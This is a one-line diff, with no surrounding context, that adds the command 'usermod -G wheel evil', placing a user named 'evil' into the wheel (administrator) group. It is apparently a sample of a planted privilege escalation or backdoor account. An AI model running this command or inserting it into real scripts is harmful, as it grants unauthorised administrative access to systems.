@@ -1,0 +1,1 @@
+usermod -G wheel evil
